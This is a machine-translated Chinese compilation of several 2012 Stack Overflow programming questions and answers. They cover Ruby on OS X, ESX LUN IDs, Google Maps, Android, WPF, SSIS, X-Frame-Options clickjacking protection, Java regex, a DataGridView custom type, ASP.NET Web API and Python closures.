> ID：11866372
> 
> 赞同：8
> 
> 时间：2012-08-08T14:11:55.700
> 
> 标签：ruby, osx-mountain-lion

OSX Mountain Lion 上的默认 Ruby 版本是什么？还是 1.8.x 或 1.9.x ？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-08T14:34:03.663

在 Mountain Lion 上，它是 Ruby 1.8.7-p358（使用 OS X 10.8 和 10.8.3 测试）：

```
$ sw_vers
ProductName:    Mac OS X
ProductVersion: 10.8.3
BuildVersion:   12D78
$ /usr/bin/ruby -v
ruby 1.8.7 (2012-02-08 patchlevel 358) [universal-darwin12.0] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-10-01T21:10:52.407

在 OS X 10.9.5 上，ruby 现在是 2.0！

```
$ sw_vers
ProductName:    Mac OS X
ProductVersion: 10.9.5
BuildVersion:   13F34

$ /usr/bin/ruby --version
ruby 2.0.0p481 (2014-05-08 revision 45883) [universal.x86_64-darwin13] 
```

# scsi - vSphere Client 和 ESX 4.1 上的 LUN Id 和 Target Id 不匹配

> ID：11866378
> 
> 赞同：0
> 
> 时间：2012-08-08T14:12:16.623
> 
> 标签：scsi, esx, vsphere

我对 SCSI 和存储还很陌生。我几乎没有从阵列向 ESX 主机公开的 LUN。当我在 ESX 4.1 上运行 sg_map -x 时，我看到所有 LUN 的 LUN ID 都显示为 0。

[root@SRESX41 ~]# sg_map -x

/dev/sg0 4 0 0 **0** 0 /dev/sda

/dev/sg1 4 0 1 **0** 0 /dev/sdb

/dev/sg2 4 0 2 **0** 0 /dev/sdc

/dev/sg3 4 0 3 **0** 0 /dev/sdd

/dev/sg4 4 0 4 0 0 /dev/sde

/dev/sg5 4 0 5 0 0 /dev/sdf

/dev/sg6 4 0 6 0 0 /dev/sdg

/dev/sg7 4 0 7 0 0 /dev/sdh

/dev/sg8 4 0 8 0 0 /dev/sdi

/dev/sg9 4 0 9 0 0 /dev/sdj

/dev/sg10 4 0 10 0 0 /dev/sdk

/dev/sg11 4 0 11 0 0 /dev/sdl

/dev/sg12 4 0 12 0 0 /dev/sdm

/dev/sg13 4 0 13 0 0 /dev/sdn

/dev/sg14 4 0 14 0 0 /dev/sdo

/dev/sg15 4 0 15 0 0 /dev/sdp

/dev/sg16 4 0 16 0 0 /dev/sdq

/dev/sg17 0 0 0 0 0 /dev/sdr

/dev/sg18 4 0 17 **0** 0 /dev/sds

/dev/sg19 4 0 18 **0** 0 /dev/sdt

/dev/sg20 4 0 19 **0** 0 /dev/sdu

但是对于相同的 LUN，LUN id 在 vSphere Client 上的显示不同。请查看随附的 vSphere 客户端屏幕截图。谁能告诉我为什么不匹配？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:15:32.897

![ESX vSphere Client 显示 LUN ID 和目标 ID](../Images/68e4ada4273b6b5e63e34398a50ec8bb.png)

代表 arun_vj 附加丢失的图像

# javascript - 为什么当我尝试创建第二个地图实例时 Google Maps JavaScript API v3 无法正常工作？

> ID：11866380
> 
> 赞同：1
> 
> 时间：2012-08-08T14:12:22.003
> 
> 标签：javascript, google-maps, google-maps-api-3

在我的网络应用程序中，我使用的是 Google Maps JavaScript API v3。在网页中，我正在使用以下代码创建谷歌地图：

```
 var centerLatLng = new google.maps.LatLng(obj.centerlat, obj.centerlong);
 var myOptions = {
     center: centerLatLng,
     zoom: 17,
     mapTypeId: google.maps.MapTypeId.ROADMAP,
     draggable: true
 };

 var map = new google.maps.Map(document.getElementById("map_convas"), myOptions);

 var markerArray = obj.locations;
 var triangleCoords = new Array();

 for(var x=0;x<markerArray.length;x++){
      triangleCoords.push(new google.maps.LatLng(markerArray[x].latitude, markerArray[x].longitude));
 }

 var polypath = new google.maps.Polyline({
       path: triangleCoords,
       strokeColor: "#FF0000",
       strokeOpacity: 1.0,
       strokeWeight: 2
 });

 polypath.setMap(map); 
```

此代码正确显示地图。然后我在该地图下有一个按钮。当我单击该按钮时，另一个 google javascript 地图应显示在名为 map_convas_1 的 div 中，该 div 位于同一页面中。我为此编写的代码如下：

```
 $('#secondmapbtn').unbind("click");
 $('#secondmapbtn').bind('click', function(){ 

      var centerLatLng2 = new google.maps.LatLng(secondcenterlat, secondcenterlong);
 var myOptions2 = {
     center: centerLatLng2,
     zoom: 17,
     mapTypeId: google.maps.MapTypeId.ROADMAP,
     draggable: true
 };
   $('#map_convas_2').show();
 var map2 = new google.maps.Map(document.getElementById("map_convas_2"), myOptions2);

 var secondMarkerArray = secondobj.locations;

 // putting markers in map 

     for(var i=0;i<markerArray.length;i++){
      var myLatlng = new google.maps.LatLng(secondMarkerArray[i].latitude, secondMarkerArray[i].longitude);

      var marker = new google.maps.Marker({
           clickable: true,
           position: myLatlng,
           map: map2,
           zIndex: i
      });
      marker.setIcon('marker_icon.png');
}
 }); 
```

两个 div 的 HTML 都是

```
 <div id='map_convas'></div>
 <div id='map_convas_2'></div> 
```

和CSS是：

```
 #map_convas{
position: absolute;
    border-radius: 8px;
    width:657px; 
    height:592px;
    top: 50px;
    left: 100px;
 }

 #map_convas_2{
position: absolute;
    border-radius: 8px;
    width:657px; 
    height:592px;
    top: 700px;
    left: 100px;
    display:none;
 } 
```

单击按钮后，将显示第二张地图，但未正确显示。我附上了第一张和第二张地图的截图。如果我评论第一个地图实例代码，那么第二个地图工作正常。这意味着当我创建第二个地图实例时出现问题。有谁知道为什么第二张地图不行以及如何解决这个问题？

![第一张地图](../Images/7abd28c3ead20782b94767ec2cc8be00.png)

![第二张地图](../Images/8474028cef41db5aed0f9f3b43e59a9e.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T15:01:53.603

在这条线之后

`var map2 = new google.maps.Map(document.getElementById("map_convas_2"), myOptions2);`

添加

```
 google.maps.event.trigger(map2, 'resize'); 
```

您可能需要将该新行稍微向下移动代码，或设置超时。问题是`.show()`需要一些时间来重置 DOM 中的地图大小，并且 API 被告知地图在设置时仍然具有零大小。因此，您只能获得最小数量的图块以在左上角显示零大小的地图。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T06:55:23.883

```
<style>
.map img { background-color: transparent; }
#map-canvas { width:400px; height:450px; }
</style> 
```

# android - 用像素在 EditText 中设置光标位置

> ID：11866381
> 
> 赞同：0
> 
> 时间：2012-08-08T14:12:23.780
> 
> 标签：android, android-layout, android-edittext

如何在`EditText`使用像素中设置光标位置？

我试过`setSelection()`了，但它根据字符位置设置位置，而不是像素。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:24:49.133

您需要`padding`为您的`EditText`. 您可以在 xml 文件或代码中执行此操作。我在下面发布了这两种方法，`paddingLeft`用作示例和`100px`用作示例。

* * *

在您的 xml 文件中，`android:paddingLeft="100px"`将`EditText`.

这将调整`TextView`您的内部`EditText`，使其偏移`android:paddingLeft="100px"`.

**或者**

在代码中，您可以这样做：

`editText.setPadding(100, 0, 0, 0);`

你用`100`你想要偏移的任何数量的像素替换。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-08T16:38:16.550

你可以试试这个。。

```
etmsg.setText("Updated Text From another Activity");
int position = etmsg.length();
Editable etext = etmsg.getText();
Selection.setSelection(etext, position); 
```

# objective-c - 在 Xcode 中获取矩阵计算的警告

> ID：11866386
> 
> 赞同：1
> 
> 时间：2012-08-08T14:12:45.843
> 
> 标签：objective-c, xcode, matrix

我现在正在编写代码在 Xcode4.3 中进行矩阵计算。我可以构建并运行下面的代码，但我总是收到警告说，“不兼容的指针类型将 'float (*)[3][2]' 传递给 'float *' 类型的参数”有人能解释一下这是什么意思吗？我怎样才能避免警告？

```
 float num1[3][2] = { {1,5},{2,6},{3,7} };
    float num2[3][2] = { {2,2},{2,6},{3,3} }; 
    float resA[3][2];

    vDSP_vadd(&num1, 1, &num2, 1, &resA, 1, 6);

    for (int i = 0; i<3; i++) {
        for (int j = 0; j<2; j++) {
            NSLog(@"resA[%d][%d]:%f",i,j,resA[i][j]);
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:28:47.710

好吧，从技术上讲，数组**不是**指针，只是衰减为指针。如果要避免警告，可以使用：

```
 vDSP_vadd(&num1[0][0], 1, &num2[0][0], 1, &resA[0][0], 1, 6); 
```

# wpf - 如何在某些地方使用一个上下文菜单

> ID：11866391
> 
> 赞同：0
> 
> 时间：2012-08-08T14:12:52.880
> 
> 标签：wpf, datatemplate

我有一个像这样的数据模板：

```
 <DataTemplate x:Key="SchemeContextMenu">
            <ContextMenu>
                <MenuItem />
            </ContextMenu>
        </DataTemplate> 
```

如何使用下面的这个模板？

```
<TextBlock.ContextMenu>
     <ContentPresenter Content="{Binding}" ContentTemplate="{StaticResource SchemeContextMenu}"/>
</TextBlock.ContextMenu> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-09T08:17:22.957

将上下文菜单定义为资源

```
<ContextMenu x:Key="myContextMenu">...</ContextMenu> 
```

然后在您的文本块中将其召回为

```
<TextBlock ContextMenu={StaticResource myContextMenu} /> 
```

# sql - SSIS-SQL 查询平面文件，然后根据结果插入

> ID：11866396
> 
> 赞同：1
> 
> 时间：2012-08-08T14:13:05.483
> 
> 标签：sql, ssis

我的任务是实现将数据从平面 csv 文件 (A) 加载到 SQL Server 数据库 (B)。现在，虽然我是 SSIS 的初学者，但我发现进行传输相当简单。问题是，来自 CSV (A) 的数据必须加载到 (B) 内的四个不同的表中，并且我需要在插入之前检查现有数据。

例如，(A) CSV 中有一个名为 SERVER_VERSION 的列，包含在结构中：[SERVER].[VERSION]

我需要做的： 1\. 从 (A) 列中检索服务器和版本作为单独的信息（简单修剪） 2\. 在 (B) 版本表上运行选择查询以搜索此信息 3\. 如果有没有结果，我将（A）中的信息插入到（B）服务器表中，该表有一个服务器列和一个版本列

FLATFILE_SOURCE -> EXTRACT_SERVER_VERSION -> CHECK_VERSION -> INSERT_VERSION ->SQL_DESTINATION

当然，我想对 CSV 中的每一行都这样做。

现在，我最初的想法是使用数据流进行此验证，平面文件源通过脚本组件传递，该脚本组件将从平面文件中提取服务器和版本。但我觉得这是一种相当面向对象的方法，似乎不适合在 SSIS 中使用。

Q1：我从脚本中获得的数据需要在 (B) 的 SELECT 查询中使用。我实现这一点的最佳途径是什么？我可以将脚本的结果输出到数据流之外的 EXECUTE SQL QUERY，还是直接在脚本内尝试 sql 查询会更好？我很确定这不是正确的查看方式，因为这是数据分析，而不是转换。

Q2：是否有某种缓存/缓冲区可以用来存储临时信息，例如服务器和版本的配对值？它可以在数据流之外全局访问吗？

Q3：然后呢？我需要插入在数据库中找不到的行。同样，我是否最好将 SELECT 查询的结果输出到 EXECUTE SQL 任务？我怎样才能在结果中循环并插入正确的信息。

现在，我可以毫无问题地创建源和目标，但到目前为止脚本任务的运气并不好，更重要的是，运行我需要的 SQL 查询的最佳方法是什么，然后分析其中的信息并采取行动。

我知道这很模糊，听起来比实际复杂得多，但我似乎无法找到有关这种操作的信息。我看到的不是典型的教程，它不包括这种操作，或者技术问题超出了我需要做的范围。我所在部门的人也没有真正的 SSIS 经验，所以我真的可以使用一些技巧。我不是在要求特定的代码，一些关于如何组织它的提示真的会帮助我！

谢谢

PS：是的，我知道这对.net 程序来说是小菜一碟！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:18:57.283

将平面文件导入临时表。然后您可以使用执行 SQl 任务来标记您要导入的记录然后您可以对各个表进行导入。

我从来没有在没有临时表的情况下进行导入（实际上我们使用了两个，一个用于原始数据，一个用于清理后的数据）如果以后出现数据问题，可以更轻松地返回查看原始数据是什么样的。

# php - 使用“X-Frame-Options”的点击劫持保护？

> ID：11866399
> 
> 赞同：0
> 
> 时间：2012-08-08T14:13:13.750
> 
> 标签：php, html, http-headers, security

我想使用 X-Frame-Options 为我的网站添加点击劫持保护。我网站中的几个页面显示在一个框架中，所以我想保护它们，但同时正确地呈现它们。据我了解，我需要在 X-Frame-Options 值中使用 SAMEORIGIN 选项。但是 SAMEORIGIN 到底是什么意思呢？是同一个网站的意思吗？我发现的官方描述不是很清楚 2 个页面共享相同的“来源”是什么意思......这里有人可以帮我解决这个问题吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T12:50:51.623

“来源”是网站的方案+主机+端口。也就是说，`http://example.com/`有一个起源`(http, example.com, 80)`。`https://example.com/`是一个不同的起源，即`(https, example.com, 443)`。

将`x-frame-options`页眉设置`SAMEORIGIN`为所提供的页面`http://example.com/`意味着只有其他页面`http://example.com/`才能在框架中加载该页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-04T06:19:00.490

使用 X-Frame-Options customHeaders - 将多个 uri/域添加到 web.config？

解决方案 -> 将此添加到您的 web.config

```
 <httpProtocol>
        <customHeaders>
<add name="Content-Security-Policy" value="frame-ancestors 'self' website1.com website2.com;"/>
 </customHeaders>
      </httpProtocol> 
```

# eclipse - 是否可以从 Eclipse EE 直接启动浏览器（如 notepad++ 上可用的功能）？

> ID：11866403
> 
> 赞同：0
> 
> 时间：2012-08-08T14:13:22.893
> 
> 标签：eclipse, browser

在notepad++中有一个很棒的功能，你点击运行（在顶部的导航栏上）并从列表中选择一个浏览器，notepad++会自动在你选择的浏览器上显示你的页面。
有没有办法从 Eclipse（Java 的 EE）中做到这一点？
注意：在运行 JSP 时，Eclipse 在新选项卡中打开一个 Web 浏览器，但这不是我想要的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:19:04.443

是的，有很多插件可以在 dos 提示符或 shell 中运行自定义命令，其中之一是 StartExplorer 和 EasyShell 插件。然后您可以转到首选项并更改应该运行的命令，在这种情况下 iexplore.exe 将运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-09T15:47:38.967

终于找到了我要找的东西！
在 Eclipse 中遵循：Window > Preferences > General > Web Browser。
默认情况下选择“使用内部网络浏览器”，选择“使用外部网络浏览器”。要获得您选择的浏览器，请单击“新建”按钮并通过查找浏览器的可执行文件添加您想要的浏览器（它是您单击以浏览互联网的 exe，就像您现在正在做的那样）

# javascript - CSS溢出的滚动问题：滚动HTML

> ID：11866407
> 
> 赞同：7
> 
> 时间：2012-08-08T14:13:26.870
> 
> 标签：javascript, css, scroll, overflow

这是 jsFiddle 以便更好地理解：http: [//jsfiddle.net/BzYcZ/](http://jsfiddle.net/BzYcZ/)

我有一些带有滚动条的 div。

我想要的是当我使用鼠标滚动在到达 div 的末尾时停止滚动而不是滚动整个页面。

发生的事情是，当我到达 div 的末尾时，整个页面开始滚动。

我知道这是浏览器驱动的，但是是否有一些 JS 事件可以处理这种情况并防止滚动整个页面，因为我的光标在这个 div 元素上。

**编辑：**

我希望能够滚动整个页面，但只有当我的鼠标离开这个 div 时。

**解决方案**

```
.noscroll
{
    position: fixed; 
    overflow-y: scroll;
    width: 100%;
} 
```

这是 JavaScript 部分：

```
$('.small_content').hover(
    function () {
        $('body').addClass('noscroll');
    }, 
    function () {
        $('body').removeClass('noscroll');
    }
 ); 
```

这是工作 jsFiddle 的链接：http: [//jsfiddle.net/BzYcZ/3/](http://jsfiddle.net/BzYcZ/3/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:16:03.987

您可以使用 jQuery 并冻结 body/html 的任何滚动条

（顺便说一句，jQuery 是一个 Javascript 库，它使编码变得更容易和更快：http: [//jquery.com/](http://jquery.com/)）

例子：

```
$('.yourdivclass').hover(
function () {
    $('html, body').css("overflow", "hidden");
},
function () {
    $('html, body').css("overflow", "auto");
}); 
```

**更新**：

要保留滚动条并禁用它们，请遵循以下解决方案：[禁用滚动而不隐藏它？](https://stackoverflow.com/questions/8701754/just-disable-scroll-not-hide-it)

这里的例子：http: [//jsfiddle.net/BzYcZ/2/](http://jsfiddle.net/BzYcZ/2/)

此处更新了 Javascript：

```
$('.small_content').hover(
function () {
   $('body').addClass('noscroll');
},
function () {
    $('body').removeClass('noscroll');
});​ 
```

额外的 CSS：

```
body.noscroll
{
    position: fixed; 
    overflow-y: scroll;
    width: 100%;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:18:29.980

`overflow:hidden`如果您根本不想滚动正文容器，您可以向正文添加属性，或者您可以使用 jQuery 冻结正文容器滚动条，就像在 Facebook 所做的那样。

# java - 删除特殊字符前后的空格

> ID：11866409
> 
> 赞同：1
> 
> 时间：2012-08-08T14:13:27.980
> 
> 标签：java, string

我有一个字符串，

```
String sample = "He won the International Rating Chess Tournament (IRCT ) which concluded on Dec. 22 at the Blue Sky Hotel , Canada"; 
```

我想删除字符')'和','之前留下的空格（**如果有的话）。**所以最终的输出应该是这样的，

```
He won the International Rating Chess Tournament (IRCT) which concluded on Dec. 22 at the Blue Sky Hotel, Canada 
```

谁能告诉我该怎么做？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-08T14:15:24.143

```
sample.replaceAll("\\s+(?=[),])", ""); 
```

即删除所有`\s+`紧随其后的`(?=...)`任何字符的空格`[),]`。双反斜杠用于转义。有关正则表达式的更多信息可以在这里看到：

[http://docs.oracle.com/javase/7/docs/api/java/util/regex/Pattern.html](http://docs.oracle.com/javase/7/docs/api/java/util/regex/Pattern.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-08T14:15:52.690

```
sample = sample.replaceAll(" ,", ",").replaceAll(" )", ")"); 
```

如果要在`)`and之前删除任意数量的空格`,`，可以使用正则表达式：

```
sample = sample.replaceAll("\\s+,", ",").replaceAll("\\s+\\)", ")"); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:18:57.453

```
 String sample = "He won the International Rating Chess Tournament (IRCT ) which concluded on Dec. 22 at the Blue Sky Hotel , Canada";
    sample=sample.replace(" )", ")");
    sample=sample.replace(" ,", ","); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-07-05T15:26:13.853

此正则表达式应删除前后的空格 -

`\s+(?=[-])|(?<=-)\s*`

# c# - c# DataGridView bound to DataTable - 如何将字符添加到双列？

> ID：11866414
> 
> 赞同：3
> 
> 时间：2012-08-08T14:13:50.867
> 
> 标签：c#, sorting, datagridview, datatable

我已经`DataGridView`绑定了`DataTable`一些数字数据，我需要两件事来确保它们正常工作：

1.  数字排序 ( `doubles`/ `ints`) 对每一列的数字，
2.  在特殊情况下可以添加一些文本（如“x”或“-”）而不是数字。

有没有一种简单的方法可以在 DataTable 级别添加它们？

我知道我可以将`DataTable`'s 的列类型`String`更改为绘制等

此外，由于我的 DGV 生成的数量和方式，它不会像为我拥有的每个 DGV 添加一种方法那么简单。

**[编辑]**

我将同一组 DataTables 编写到 excel 文件中，因此对它们的工作方式进行重大更改将是有问题的并且容易出错 - 我想避免它。

我在大多数情况下填充数据表的代码如下所示：

```
var row = MyDataTable.GetMyDataTableNewRow();  
row.partName = part.name;  
row.weight = part.weight.ToString();  // it's double  
row.quantity = part.GetParentSet().FindQuantities(part.name).ToString(); // it's int  
row.maxsize = part.CalculateMaxSize().ToString();  
MyDataTable.AddMyDataTableRow(row); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:37:38.403

在级别定义所需行为的唯一方法`DataTable`是引入一个包含双精度和字符串的自定义类型，并定义一个适当的`TypeConverter`（以正确显示对象并在 中启用编辑`DataGridView`）。

例如：

```
[TypeConverter(typeof(DoubleOrTextConverter))]
public class DoubleOrText : IComparable
{
    public double Value { get; private set; }
    public string Text { get; private set; }
    public DoubleOrText(double val, string text)
    {
        this.Value = val;
        this.Text = text;
    }
    public static DoubleOrText FromString(System.Globalization.CultureInfo culture, string str)
    {
        double v;
        if (double.TryParse(str, out v))
            return new DoubleOrText(v, null);
        return new DoubleOrText(0, str);
    }
    public string ToString(System.Globalization.CultureInfo culture)
    {
        if (this.Text != null)
            return this.Text;
        return this.Value.ToString(culture);
    }
    // define your sorting strategy here
    public int CompareTo(object obj)
    {
        if (obj == null) return 1;

        var other = obj as DoubleOrText;
        if (other != null)
            return this.Value.CompareTo(other.Value);
        else
            throw new ArgumentException("Object is not a DoubleOrText");
    }
}

public class DoubleOrTextConverter : TypeConverter
{
    public override bool CanConvertFrom(ITypeDescriptorContext context, Type sourceType)
    {
        if (sourceType == typeof(string))
            return true;
        return base.CanConvertFrom(context, sourceType);
    }
    public override object ConvertFrom(ITypeDescriptorContext context, System.Globalization.CultureInfo culture, object value)
    {
        if (value is string)
            return DoubleOrText.FromString(culture, value as string);
        return base.ConvertFrom(context, culture, value);
    }
    public override object ConvertTo(ITypeDescriptorContext context, System.Globalization.CultureInfo culture, object value, Type destinationType)
    {
        if (destinationType == typeof(string))
        {
            var dValue = (DoubleOrText)value;
            return dValue.ToString(culture);
        }
        return base.ConvertTo(context, culture, value, destinationType);
    }
} 
```

使用示例：

```
DataTable dt = new DataTable();
dt.Columns.Add("Column 1", typeof(DoubleOrText));

dt.Rows.Add(new DoubleOrText(0.0, null));
dt.Rows.Add(new DoubleOrText(1.0, "X"));
dt.Rows.Add(new DoubleOrText(2.3, "-"));
dt.Rows.Add(new DoubleOrText(4.1, null));

this.dataGridView1.DataSource = dt; 
```

结果：

![在此处输入图像描述](../Images/73cb67fff376e3998eb5fff192baea11.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T16:56:20.117

使用 ，`DataGridView`您可以在 UI 级别应用格式，以处理您在不将列更改为文本的情况下专门更改数字列中的某些值的情况。

这是使用 的`CellFormatting`和`CellParsing`事件来实现的`DataGridView`。

例如，假设您的数据表中有一个 int 列，并且您希望将 1 的所有实例显示为 x，将 3 的所有实例显示为 y。

您`CellFormatting`像这样使用事件：

```
void dataGridView1_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)
{
    if (dataGridView1.Columns[e.ColumnIndex].Name == "CustomerID")
    {
        if (int.Parse(e.Value.ToString()) == 1)
        {
            e.Value = "x";
        }
        else if (int.Parse(e.Value.ToString()) == 3)
        {
            e.Value = "y";
        }
    }
} 
```

使用这种方法，底层数据表和底层单元格值都不会受到影响，因此格式化仍然可以正常工作，就好像你有数字 1 和 3。

然后，您将需要在`CellParsing`事件中进行一些处理以将字符串转换回来。这又是因为您的基础表仍然有一个数字列。

在被解析的值不转换为 int 的情况下，类似下面的内容只是使用单元格的实际值。但是，您可以在此处理程序中执行您需要的任何操作：

```
void dataGridView1_CellParsing(object sender, DataGridViewCellParsingEventArgs e)
{
    int parsedValue = 0;
    if (!int.TryParse(e.Value.ToString(), out parsedValue))
    {
        if (int.TryParse(dataGridView1[e.ColumnIndex, e.RowIndex].Value.ToString(), out parsedValue))
            e.Value = parsedValue;
        else
            e.Value = 0;

        e.ParsingApplied = true;
    }

} 
```

# asp.net-mvc-3 - 托管 ASP.Net web api 并从另一个 MVC 应用程序使用

> ID：11866418
> 
> 赞同：6
> 
> 时间：2012-08-08T14:14:02.407
> 
> 标签：asp.net-mvc-3, asmx, asp.net-web-api

我是 ASP.Net MVC 和 ASP.Net web api 的新手。

我从事过 Web 服务并使用它们。

但我不确定如何托管 ASP.Net web api 并从另一个 ASP.Net MVC 应用程序中使用它。我发现了一些样本，人们使用的是同一个项目中的 api。在现实世界中，我真的怀疑使用仅限于一个项目。

可以请一些机构发布一些可以解释相同的示例或链接吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T15:02:48.280

如果您主要使用 API 从您的 Web 客户端进行 AJAX 类型调用，那么在 MVC Web 应用程序中托管 ASP.NET Web API 非常有意义。将 API 和 Web 应用程序放在同一个项目中消除了需要 JSONP 的跨域 Ajax 调用的问题。但是，如果需要，ASP.NET Web API 可以使用 WebApiContrib 提供的自定义格式化程序（如 JsonMediaTypeFormatter）轻松支持[JSONP](https://github.com/WebApiContrib)。

ASP.NET Web API 使开发 REST API 变得容易。您使用与在 MVC 中开发控制器相同的约定。要将它与您的 Web 应用程序分开创建，只需创建一个 MVC 4 项目并使用 ApiController 而不是用于呈现视图的标准控制器来创建您的控制器。然后就像任何 Web 应用程序一样将您的应用程序部署到 IIS（您也可以在 Windows 服务之类的东西中自托管 ASP.NET Web API）。这是[官方 ASP.NET Web API 网站上的一个示例，它从控制台应用程序调用在 ASP.NET Web API 中开发的 REST API](http://www.asp.net/web-api/overview/web-api-clients/calling-a-web-api-from-a-net-client)。这个网站上有更多的例子。

# python - 如何在没有类的情况下在 Python 中维护状态？

> ID：11866419
> 
> 赞同：18
> 
> 时间：2012-08-08T14:14:04.233
> 
> 标签：python, closures, state

有没有`pythonic`办法在不完全面向对象的情况下保持状态（例如，为了优化）？

为了更好地说明我的问题，这里有一个我在 JavaScript 中经常使用的模式示例：

```
var someFunc = (function () {
    var foo = some_expensive_initialization_operation();
    return someFunc (bar) {
        // do something with foo and bar
    }
}()); 
```

在外部，这只是一个与其他函数一样的函数，不需要初始化对象或类似的东西，但是闭包允许一次计算值，然后我基本上将其用作常量。

Python 中的一个例子是优化正则表达式时 - 使用`re.compile`和存储编译后的版本`match`和`search`操作很有用。

我知道在 Python 中执行此操作的唯一方法是在模块范围内设置一个变量：

```
compiled_regex = compile_my_regex()

def try_match(m): # In reality I wouldn't wrap it as pointlessly as this
    return compiled_regex.match(m) 
```

或者通过创建一个类：

```
class MatcherContainer(object):
    def __init__(self):
        self.compiled_regex = compile_my_regex()
    def try_match(self, m):
        self.compiled_regex.match(m)

my_matcher = MatcherContainer() 
```

前一种方法是临时的，函数和在它上面声明的变量是否相互关联并不是很清楚。它还稍微污染了模块的命名空间，我对此不太满意。

后一种方法看起来很冗长，并且在样板上有点沉重。

我能想到的解决这个问题的唯一另一种方法是将任何像这样的函数分解到单独的文件（模块）中，然后只导入函数，这样一切都很干净。

更有经验的 Pythoners 有什么关于如何处理这个问题的建议吗？还是您只是不担心并继续解决问题？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-08T14:27:33.727

您也可以使用默认参数完成此操作：

```
def try_match(m, re_match=re.compile(r'sldkjlsdjf').match):
    return re_match(m) 
```

因为默认参数只在模块导入时评估一次。

或者更简单：

```
try_match = lambda m, re_match=re.compile(r'sldkjlsdjf').match: re_match(m) 
```

或者最简单的：

```
try_match = re.compile(r'sldkjlsdjf').match 
```

这不仅节省了重新编译时间（实际上它实际上是在 re 模块内部缓存的），而且还节省了 '.match' 方法的查找。在繁忙的功能或紧密的循环中，那些'.' 决议可以加起来。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-08-08T14:27:35.190

你可以在 Python 中定义闭包，就像在 JavaScript 中定义闭包一样。

```
def get_matcher():
    compiled_regex = compile_my_regex()

    def try_match(m)
        return compiled_regex.match(m)

    return try_match 
```

但是，在 Python 2.x 中，闭包是只读的（`compiled_regex`对于上面的示例，您不能重新分配给内部函数调用）。如果闭包变量是一个可变数据结构（例如`list`, `dict`, `set`），你可以在你的函数调用中修改它。

```
def get_matcher():
    compiled_regex = compile_my_regex()
    match_cache = {}

    def try_match(m):
        if m not in match_cache:
           match_cache[m] = compiled_regex.match(m)

        return match_cache[m]

    return try_match 
```

在 Python 3.x 中，您可以使用`nonlocal`关键字在函数调用中重新分配给闭包变量。[(PEP-3104)](http://www.python.org/dev/peps/pep-3104/)

另请参阅以下有关 Python 闭包的问题：

*   [与语言 X 闭包相比，Python 中的闭包有哪些限制？](https://stackoverflow.com/questions/141642/what-limitations-have-closures-in-python-compared-to-language-x-closures)
*   [读/写 Python 闭包](https://stackoverflow.com/questions/2009402/read-write-python-closures)

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-08-08T14:18:57.787

关于什么

```
def create_matcher(re):
    compiled_regex = compile_my_regex()
    def try_match(m):
        return compiled_regex.match(m)
    return try_match

matcher = create_matcher(r'(.*)-(.*)')
print matcher("1-2") 
```

?

但在大多数情况下，类更好更干净。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-08-09T02:22:25.807

您可以在任何函数中存储属性。由于函数名称是全局的，您可以在其他函数中检索它。例如：

```
def memorize(t):
    memorize.value = t

def get():
    return memorize.value

memorize(5)
print get() 
```

输出：

```
5 
```

您可以使用它将状态存储在单个函数中：

```
def memory(t = None):
    if t:
        memory.value = t
    return memory.value

print memory(5)
print memory()
print memory()
print memory(7)
print memory()
print memory() 
```

输出：

```
5
5
5
7
7
7 
```

当然它的用处是有限的。[在这个问题](https://stackoverflow.com/a/2945146/235698)中，我只在 SO 上使用过它。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-08-08T14:43:26.127

一个常用的约定是在私有模块级全局变量之前加上下划线，以表明它们不是模块导出 API 的一部分：

```
# mymodule.py

_MATCHER = compile_my_regex()

def try_match(m):
    return _MATCHER.match(m) 
```

你不应该气馁这样做——它比函数闭包中的隐藏变量更可取。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-09-08T23:48:48.943

你可以使用 generator.send(); 它可能不适合这种特殊情况，但对于维护没有类的状态很有用。调用 '.send(x)' 在调用 yield 后设置值。如果调用 'next' 而不是 possible_vals 将是无。[相关发送问题](https://stackoverflow.com/questions/19302530/python-generator-send-function-purpose)。

```
def try_match(regex = '', target = ''):
    cache = {}
    while True:
        if regex not in cache:
            cache[regex] = re.compile(regex).match
        possible_vals = (yield cache[regex](target))
        if possible_vals is not None:
            (regex, target) = possible_vals

m = try_match(r'(.*)-(.*)', '1-2')
print(next(m))
m.send((r'(.*)-(.*)', '3-4'))
print(next(m))

#Note that you have to call yield before you can send it more values
n = try_match()
n.send((r'(.*)-(.*)', '5-6'))
print(next(n)) 
```

# matlab - matlab中的曲面插值

> ID：11866420
> 
> 赞同：0
> 
> 时间：2012-08-08T14:14:13.660
> 
> 标签：matlab, interpolation

